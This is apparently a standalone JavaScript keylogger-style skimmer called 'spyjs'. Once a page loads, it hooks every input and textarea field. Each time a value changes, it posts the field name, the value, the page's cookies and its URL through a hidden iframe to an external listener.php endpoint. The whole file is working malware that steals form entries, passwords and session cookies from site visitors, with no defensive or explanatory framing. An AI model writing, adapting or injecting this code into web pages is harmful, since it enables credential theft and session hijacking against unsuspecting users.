var spyjs_location = ""; //location of listener.php

window.addEventListener("load", function() {
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("id", "thiefmailbox");
	ifrm.setAttribute("name", "thiefmailbox");
	ifrm.style.display = "none";
	document.body.appendChild(ifrm);
	
	var inputs = document.querySelectorAll('input');
	for(var i = 0; i < inputs.length; i++) {
		inputs[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
	}
	var textareas = document.getElementsByTagName('textarea');
	for(var i = 0; i < textareas.length; i++) {
		textareas[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
	}
	spyjs_getLocation();
}, false);

	
function spyjs_getLocation(){
	var loc = {};
	spyjs_send(loc);
}
function spyjs_getInput(inputInfo){
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		spyjs_send(stolenInput);
	}
}
function spyjs_send(params){
	var form = document.createElement("form");
	form.setAttribute("method", "post");
	form.setAttribute("target", "thiefmailbox");
	form.setAttribute("action", spyjs_location+"?lo="+location.href);
	var field = document.createElement("input");
	field.setAttribute("type", "hidden");
	field.setAttribute("name", "cookie");
	field.setAttribute("value", document.cookie);
	form.appendChild(field);
	for(var key in params) {
		if(params.hasOwnProperty(key)) {
			var field = document.createElement("input");
			field.setAttribute("type", "hidden");
			field.setAttribute("name", "input_name");
			field.setAttribute("value", key);
			form.appendChild(field);
			var field = document.createElement("input");
			field.setAttribute("type", "hidden");
			field.setAttribute("name", "input_value");
			field.setAttribute("value", params[key]);
			form.appendChild(field);
		}
	}
	document.body.appendChild(form);
	form.submit();
}